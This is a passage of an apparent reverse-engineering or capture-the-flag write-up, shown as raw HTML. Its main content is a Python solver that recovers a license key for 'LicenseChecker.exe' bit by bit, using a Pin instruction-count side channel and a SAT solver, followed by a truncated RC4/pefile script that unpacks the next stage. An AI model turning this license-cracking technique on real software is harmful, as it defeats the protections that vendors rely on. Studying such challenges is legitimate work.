class="built_in">sorted</span>([q <span class="keyword">for</span> q, v <span class="keyword">in</span> bit63_ambiguous.items() <span class="keyword">if</span> v]),</span><br><span class="line">            <span class="string">&quot;fixed_cipher_hex32_partial&quot;</span>: fixed_cipher_hex32(fixed_bits),</span><br><span class="line">            <span class="string">&quot;ts&quot;</span>: time.time(),</span><br><span class="line">            <span class="string">&quot;cmd&quot;</span>: pin_cmd</span><br><span class="line">        &#125;</span><br><span class="line">        save_ckpt(ckpt_path, obj)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">clear_ambiguous_from_q</span>(<span class="params">q_start: <span class="built_in">int</span></span>):</span><br><span class="line">        <span class="keyword">for</span> qq <span class="keyword">in</span> <span class="built_in">range</span>(q_start, N_QWORDS): bit63_ambiguous.pop(qq, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decide_bit63_for_q</span>(<span class="params">q: <span class="built_in">int</span></span>):</span><br><span class="line">        c0 = <span class="built_in">dict</span>(fixed_bits); c0[(q, <span class="number">63</span>)] = <span class="number">0</span></span><br><span class="line">        c1 = <span class="built_in">dict</span>(fixed_bits); c1[(q, <span class="number">63</span>)] = <span class="number">1</span></span><br><span class="line">        r0 = probe(c0)</span><br><span class="line">        r1 = probe(c1)</span><br><span class="line">        s0, _, _, st0 = r0</span><br><span class="line">        s1, _, _, st1 = r1</span><br><span class="line">        sat0 = is_sat_status(st0)</span><br><span class="line">        sat1 = is_sat_status(st1)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[q<span class="subst">&#123;q&#125;</span> bit63 SAT-check] 0-&gt;<span class="subst">&#123;s0&#125;</span> (<span class="subst">&#123;st0&#125;</span>), 1-&gt;<span class="subst">&#123;s1&#125;</span> (<span class="subst">&#123;st1&#125;</span>)&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> sat0 <span class="keyword">and</span> <span class="keyword">not</span> sat1:</span><br><span class="line">            fixed_bits[(q, <span class="number">63</span>)] = <span class="number">0</span></span><br><span class="line">            bit63_ambiguous[q] = <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[q<span class="subst">&#123;q&#125;</span>] bit63 = 0 (only SAT)&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> sat1 <span class="keyword">and</span> <span class="keyword">not</span> sat0:</span><br><span class="line">            fixed_bits[(q, <span class="number">63</span>)] = <span class="number">1</span></span><br><span class="line">            bit63_ambiguous[q] = <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[q<span class="subst">&#123;q&#125;</span>] bit63 = 1 (only SAT)&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">not</span> sat0) <span class="keyword">and</span> (<span class="keyword">not</span> sat1):</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;[q<span class="subst">&#123;q&#125;</span>] bit63: both branches UNSAT under printable constraints&quot;</span>)</span><br><span class="line">        bit63_ambiguous[q] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> q &lt; N_QWORDS - <span class="number">1</span>:</span><br><span class="line">            fixed_bits[(q, <span class="number">63</span>)] = <span class="number">0</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[q<span class="subst">&#123;q&#125;</span>] bit63 0/1 both SAT -&gt; tentative 0, will verify by next q&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fixed_bits.pop((q, <span class="number">63</span>), <span class="literal">None</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[q<span class="subst">&#123;q&#125;</span>] bit63 0/1 both SAT -&gt; keep unresolved for final stage&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> q <span class="keyword">in</span> <span class="built_in">range</span>(current_q, N_QWORDS):</span><br><span class="line">        current_q = q</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n========== Recovering qword<span class="subst">&#123;q&#125;</span> ==========&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            restart = <span class="literal">False</span></span><br><span class="line">            bit = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> bit &lt;= <span class="number">62</span>:</span><br><span class="line">                <span class="keyword">if</span> (q, bit) <span class="keyword">in</span> fixed_bits:</span><br><span class="line">                    bit += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                c0 = <span class="built_in">dict</span>(fixed_bits); c0[(q, bit)] = <span class="number">0</span></span><br><span class="line">                c1 = <span class="built_in">dict</span>(fixed_bits); c1[(q, bit)] = <span class="number">1</span></span><br><span class="line">                r0 = probe(c0)</span><br><span class="line">                r1 = probe(c1)</span><br><span class="line">                s0, i0, e0, st0 = r0</span><br><span class="line">                s1, i1, e1, st1 = r1</span><br><span class="line">                sat0 = is_sat_status(st0)</span><br><span class="line">                sat1 = is_sat_status(st1)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[q<span class="subst">&#123;q&#125;</span> bit<span class="subst">&#123;bit&#125;</span>] 0-&gt;<span class="subst">&#123;s0&#125;</span> (<span class="subst">&#123;st0&#125;</span>), 1-&gt;<span class="subst">&#123;s1&#125;</span> (<span class="subst">&#123;st1&#125;</span>)&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> (</span><br><span class="line">                    q &gt; <span class="number">0</span> <span class="keyword">and</span> bit == <span class="number">0</span> <span class="keyword">and</span> sat0 <span class="keyword">and</span> sat1</span><br><span class="line">                    <span class="keyword">and</span> (s0 <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>) <span class="keyword">and</span> (s1 <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>) <span class="keyword">and</span> (s0 == s1)</span><br><span class="line">                    <span class="keyword">and</span> bit63_ambiguous.get(q - <span class="number">1</span>, <span class="literal">False</span>)):</span><br><span class="line">                    prev = fixed_bits.get((q - <span class="number">1</span>, <span class="number">63</span>), <span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">if</span> prev == <span class="number">0</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;  [rule] q<span class="subst">&#123;q&#125;</span> bit0 0/1 same score=<span class="subst">&#123;s0&#125;</span>, flip q<span class="subst">&#123;q-<span class="number">1</span>&#125;</span>.bit63: 0-&gt;1 and restart q<span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line">                        fixed_bits[(q - <span class="number">1</span>, <span class="number">63</span>)] = <span class="number">1</span></span><br><span class="line">                        bit63_ambiguous[q - <span class="number">1</span>] = <span class="literal">False</span></span><br><span class="line">                        clear_from_qword(fixed_bits, q)</span><br><span class="line">                        clear_ambiguous_from_q(q)</span><br><span class="line">                        probe_cache.clear()</span><br><span class="line">                        dump_ckpt(note=<span class="string">f&quot;rollback: set q<span class="subst">&#123;q-<span class="number">1</span>&#125;</span>.bit63=1 then restart q<span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line">                        restart = <span class="literal">True</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">not</span> sat0) <span class="keyword">and</span> (<span class="keyword">not</span> sat1): <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;q<span class="subst">&#123;q&#125;</span> bit<span class="subst">&#123;bit&#125;</span>: both branches UNSAT under printable constraints&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> sat0 <span class="keyword">and</span> (<span class="keyword">not</span> sat1):</span><br><span class="line">                    chosen_bit = <span class="number">0</span></span><br><span class="line">                    sb, ib, eb, stb = r0</span><br><span class="line">                <span class="keyword">elif</span> sat1 <span class="keyword">and</span> (<span class="keyword">not</span> sat0):</span><br><span class="line">                    chosen_bit = <span class="number">1</span></span><br><span class="line">                    sb, ib, eb, stb = r1</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> (s0 <span class="keyword">is</span> <span class="literal">None</span>) <span class="keyword">and</span> (s1 <span class="keyword">is</span> <span class="literal">None</span>):</span><br><span class="line">                        chosen_bit = <span class="number">0</span></span><br><span class="line">                        sb, ib, eb, stb = r0</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;  [warn] both SAT but no score, fallback choose bit=0&quot;</span>)</span><br><span class="line">                    <span class="keyword">elif</span> s0 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                        chosen_bit = <span class="number">1</span></span><br><span class="line">                        sb, ib, eb, stb = r1</span><br><span class="line">                    <span class="keyword">elif</span> s1 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                        chosen_bit = <span class="number">0</span></span><br><span class="line">                        sb, ib, eb, stb = r0</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">if</span> s1 &gt; s0:</span><br><span class="line">                            chosen_bit = <span class="number">1</span></span><br><span class="line">                            sb, ib, eb, stb = r1</span><br><span class="line">                        <span class="keyword">elif</span> s0 &gt; s1:</span><br><span class="line">                            chosen_bit = <span class="number">0</span></span><br><span class="line">                            sb, ib, eb, stb = r0</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            chosen_bit = <span class="number">0</span></span><br><span class="line">                            sb, ib, eb, stb = r0</span><br><span class="line">                <span class="keyword">if</span> eb <span class="keyword">is</span> <span class="literal">None</span>: <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;q<span class="subst">&#123;q&#125;</span> bit<span class="subst">&#123;bit&#125;</span>: chosen branch has no enc hex&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> sb <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    enc32 = <span class="built_in">bytes</span>.fromhex(eb)</span><br><span class="line">                    newly, conflict = absorb_by_score(fixed_bits, enc32, sb)</span><br><span class="line">                <span class="keyword">else</span>: newly, conflict = [], <span class="literal">None</span></span><br><span class="line">                <span class="keyword">if</span> (q, bit) <span class="keyword">not</span> <span class="keyword">in</span> fixed_bits: fixed_bits[(q, bit)] = chosen_bit</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  -&gt; bit<span class="subst">&#123;bit&#125;</span>=<span class="subst">&#123;chosen_bit&#125;</span>, score=<span class="subst">&#123;sb&#125;</span>, auto_add=<span class="subst">&#123;<span class="built_in">len</span>(newly)&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> conflict <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: <span class="built_in">print</span>(<span class="string">f&quot;  [warn] absorb conflict at gbit=<span class="subst">&#123;conflict[<span class="string">&#x27;gbit&#x27;</span>]&#125;</span>, old=<span class="subst">&#123;conflict[<span class="string">&#x27;old&#x27;</span>]&#125;</span> new=<span class="subst">&#123;conflict[<span class="string">&#x27;new&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">                sample = [(qq, bb, vv) <span class="keyword">for</span> (qq, bb, vv) <span class="keyword">in</span> newly <span class="keyword">if</span> qq == q <span class="keyword">and</span> bb &gt;= bit][:<span class="number">8</span>]</span><br><span class="line">                <span class="keyword">if</span> sample: <span class="built_in">print</span>(<span class="string">f&quot;     auto sample: <span class="subst">&#123;sample&#125;</span>&quot;</span>)</span><br><span class="line">                dump_ckpt(note=<span class="string">f&quot;q<span class="subst">&#123;q&#125;</span> bit<span class="subst">&#123;bit&#125;</span> choose <span class="subst">&#123;chosen_bit&#125;</span> score=<span class="subst">&#123;sb&#125;</span>&quot;</span>)</span><br><span class="line">                bit += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> restart: <span class="keyword">continue</span></span><br><span class="line">            decide_bit63_for_q(q)</span><br><span class="line">            dump_ckpt(note=<span class="string">f&quot;q<span class="subst">&#123;q&#125;</span> bit63 decided/marked&quot;</span>)</span><br><span class="line">            uniq, one_hex, alt_hex = qword_plain_uniqueness(</span><br><span class="line">                fixed_bits,</span><br><span class="line">                q,</span><br><span class="line">                forbid_zero_input=(<span class="keyword">not</span> args.allow_zero_input),</span><br><span class="line">                printable_only=printable_only,</span><br><span class="line">                printable_min=printable_min,</span><br><span class="line">                printable_max=printable_max,</span><br><span class="line">                allowed_charset=allowed_charset)</span><br><span class="line">            <span class="keyword">if</span> uniq: <span class="built_in">print</span>(<span class="string">f&quot;[q<span class="subst">&#123;q&#125;</span>] Unique: <span class="subst">&#123;one_hex&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>: <span class="built_in">print</span>(<span class="string">f&quot;[q<span class="subst">&#123;q&#125;</span>] Not unique: one=<span class="subst">&#123;one_hex&#125;</span>, alt=<span class="subst">&#123;alt_hex&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n========== Final output ==========&quot;</span>)</span><br><span class="line">    final_msb_list: <span class="type">List</span>[<span class="built_in">int</span>]</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">3</span>, <span class="number">63</span>) <span class="keyword">in</span> fixed_bits <span class="keyword">and</span> (<span class="keyword">not</span> bit63_ambiguous.get(<span class="number">3</span>, <span class="literal">False</span>)): final_msb_list = [fixed_bits[(<span class="number">3</span>, <span class="number">63</span>)]]</span><br><span class="line">    <span class="keyword">else</span>: final_msb_list = [<span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">    candidates = []</span><br><span class="line">    sat_count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> msb <span class="keyword">in</span> final_msb_list:</span><br><span class="line">        fb = <span class="built_in">dict</span>(fixed_bits)</span><br><span class="line">        fb[(<span class="number">3</span>, <span class="number">63</span>)] = msb</span><br><span class="line">        sat_one = solve_one_input(</span><br><span class="line">            fb,</span><br><span class="line">            forbid_zero_input=(<span class="keyword">not</span> args.allow_zero_input),</span><br><span class="line">            printable_only=printable_only,</span><br><span class="line">            printable_min=printable_min,</span><br><span class="line">            printable_max=printable_max,</span><br><span class="line">            allowed_charset=allowed_charset)</span><br><span class="line">        <span class="keyword">if</span> sat_one <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[final msb=<span class="subst">&#123;msb&#125;</span>] UNSAT (printable)&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        sat_count += <span class="number">1</span></span><br><span class="line">        inp32, enc32 = sat_one</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            score = oracle.query(inp32)</span><br><span class="line">            status = <span class="string">&quot;ok&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            score = <span class="literal">None</span></span><br><span class="line">            status = <span class="string">f&quot;oracle_error:<span class="subst">&#123;e&#125;</span>&quot;</span></span><br><span class="line">        u0 = qword_plain_uniqueness(</span><br><span class="line">            fb, <span class="number">0</span>,</span><br><span class="line">            forbid_zero_input=(<span class="keyword">not</span> args.allow_zero_input),</span><br><span class="line">            printable_only=printable_only,</span><br><span class="line">            printable_min=printable_min,</span><br><span class="line">            printable_max=printable_max,</span><br><span class="line">            allowed_charset=allowed_charset)</span><br><span class="line">        u1 = qword_plain_uniqueness(</span><br><span class="line">            fb, <span class="number">1</span>,</span><br><span class="line">            forbid_zero_input=(<span class="keyword">not</span> args.allow_zero_input),</span><br><span class="line">            printable_only=printable_only,</span><br><span class="line">            printable_min=printable_min,</span><br><span class="line">            printable_max=printable_max,</span><br><span class="line">            allowed_charset=allowed_charset)</span><br><span class="line">        u2 = qword_plain_uniqueness(</span><br><span class="line">            fb, <span class="number">2</span>,</span><br><span class="line">            forbid_zero_input=(<span class="keyword">not</span> args.allow_zero_input),</span><br><span class="line">            printable_only=printable_only,</span><br><span class="line">            printable_min=printable_min,</span><br><span class="line">            printable_max=printable_max,</span><br><span class="line">            allowed_charset=allowed_charset)</span><br><span class="line">        u3 = qword_plain_uniqueness(</span><br><span class="line">            fb, <span class="number">3</span>,</span><br><span class="line">            forbid_zero_input=(<span class="keyword">not</span> args.allow_zero_input),</span><br><span class="line">            printable_only=printable_only,</span><br><span class="line">            printable_min=printable_min,</span><br><span class="line">            printable_max=printable_max,</span><br><span class="line">            allowed_charset=allowed_charset)</span><br><span class="line">        item = &#123;</span><br><span class="line">            <span class="string">&quot;q3_msb&quot;</span>: msb,</span><br><span class="line">            <span class="string">&quot;status&quot;</span>: status,</span><br><span class="line">            <span class="string">&quot;shr_num&quot;</span>: score,</span><br><span class="line">            <span class="string">&quot;input32_hex&quot;</span>: inp32.<span class="built_in">hex</span>(),</span><br><span class="line">            <span class="string">&quot;enc32_hex&quot;</span>: enc32.<span class="built_in">hex</span>(),</span><br><span class="line">            <span class="string">&quot;fixed_cipher_hex32&quot;</span>: fixed_cipher_hex32(fb),</span><br><span class="line">            <span class="string">&quot;uniqueness&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;q0&quot;</span>: &#123;<span class="string">&quot;unique&quot;</span>: u0[<span class="number">0</span>], <span class="string">&quot;one&quot;</span>: u0[<span class="number">1</span>], <span class="string">&quot;alt&quot;</span>: u0[<span class="number">2</span>]&#125;,</span><br><span class="line">                <span class="string">&quot;q1&quot;</span>: &#123;<span class="string">&quot;unique&quot;</span>: u1[<span class="number">0</span>], <span class="string">&quot;one&quot;</span>: u1[<span class="number">1</span>], <span class="string">&quot;alt&quot;</span>: u1[<span class="number">2</span>]&#125;,</span><br><span class="line">                <span class="string">&quot;q2&quot;</span>: &#123;<span class="string">&quot;unique&quot;</span>: u2[<span class="number">0</span>], <span class="string">&quot;one&quot;</span>: u2[<span class="number">1</span>], <span class="string">&quot;alt&quot;</span>: u2[<span class="number">2</span>]&#125;,</span><br><span class="line">                <span class="string">&quot;q3&quot;</span>: &#123;<span class="string">&quot;unique&quot;</span>: u3[<span class="number">0</span>], <span class="string">&quot;one&quot;</span>: u3[<span class="number">1</span>], <span class="string">&quot;alt&quot;</span>: u3[<span class="number">2</span>]&#125;&#125;&#125;</span><br><span class="line">        candidates.append(item)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[final msb=<span class="subst">&#123;msb&#125;</span>] status=<span class="subst">&#123;status&#125;</span>, shr=<span class="subst">&#123;score&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  input32 = <span class="subst">&#123;item[<span class="string">&#x27;input32_hex&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> sat_count == <span class="number">0</span>: <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;final stage: both q3.msb branches UNSAT under printable constraints&quot;</span>)</span><br><span class="line">    out = &#123;</span><br><span class="line">        <span class="string">&quot;config&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;workdir&quot;</span>: <span class="built_in">str</span>(workdir),</span><br><span class="line">            <span class="string">&quot;pin_cmd&quot;</span>: pin_cmd,</span><br><span class="line">            <span class="string">&quot;input_file&quot;</span>: args.input_file,</span><br><span class="line">            <span class="string">&quot;shr_file&quot;</span>: args.shr_file,</span><br><span class="line">            <span class="string">&quot;allow_zero_input&quot;</span>: args.allow_zero_input,</span><br><span class="line">            <span class="string">&quot;oracle_samples&quot;</span>: args.oracle_samples,</span><br><span class="line">            <span class="string">&quot;printable_only&quot;</span>: printable_only,</span><br><span class="line">            <span class="string">&quot;printable_min&quot;</span>: printable_min,</span><br><span class="line">            <span class="string">&quot;printable_max&quot;</span>: printable_max,</span><br><span class="line">            <span class="string">&quot;allowed_charset&quot;</span>: <span class="literal">None</span> <span class="keyword">if</span> allowed_charset <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> allowed_charset.decode(<span class="string">&quot;latin1&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;fixed_bits_count&quot;</span>: <span class="built_in">len</span>(fixed_bits),</span><br><span class="line">        <span class="string">&quot;fixed_bits_partial_hex32&quot;</span>: fixed_cipher_hex32(fixed_bits),</span><br><span class="line">        <span class="string">&quot;bit63_ambiguous&quot;</span>: <span class="built_in">sorted</span>([q <span class="keyword">for</span> q, v <span class="keyword">in</span> bit63_ambiguous.items() <span class="keyword">if</span> v]),</span><br><span class="line">        <span class="string">&quot;candidates&quot;</span>: candidates&#125;</span><br><span class="line">    result_path.write_text(json.dumps(out, ensure_ascii=<span class="literal">False</span>, indent=<span class="number">2</span>), encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    dump_ckpt(note=<span class="string">&quot;finished&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[+] Done: <span class="subst">&#123;result_path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] checkpoint: <span class="subst">&#123;ckpt_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_args</span>():</span><br><span class="line">    ap = argparse.ArgumentParser()</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--workdir&quot;</span>, default=<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--pin&quot;</span>, default=<span class="string">&quot;pin&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--tool&quot;</span>, default=<span class="string">&quot;Count.dll&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--app&quot;</span>, default=<span class="string">&quot;LicenseChecker.exe&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--tool-out-knob&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--input-file&quot;</span>, default=<span class="string">&quot;license.bin&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--shr-file&quot;</span>, default=<span class="string">&quot;shr_num.txt&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--timeout&quot;</span>, <span class="built_in">type</span>=<span class="built_in">float</span>, default=<span class="number">15.0</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--oracle-retries&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">2</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--oracle-samples&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">1</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--allow-zero-input&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--resume&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--ckpt&quot;</span>, default=<span class="string">&quot;recover_ckpt.json&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--result-json&quot;</span>, default=<span class="string">&quot;recover_result.json&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> ap.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    args = parse_args()</span><br><span class="line">    run(args)</span><br></pre></td></tr></table></figure>

<p>The first 32 bytes are: <code>M0Oo8zjHkcPSWFzCxmw6jrj1RgNPucTH</code>. And the decrypt function is an RC4, the resource is a new dll.</p>
<p>AutoLicense:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Dict</span>, <span class="type">List</span>, <span class="type">Optional</span>, <span class="type">Tuple</span></span><br><span class="line"><span class="keyword">import</span> pefile</span><br><span class="line"></span><br><span class="line">IDX_RE = re.<span class="built_in">compile</span>(<span class="string">r&quot;^recover_result_(\d+)\.json$&quot;</span>, re.IGNORECASE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_crypt</span>(<span class="params">key: <span class="built_in">bytes</span>, data: <span 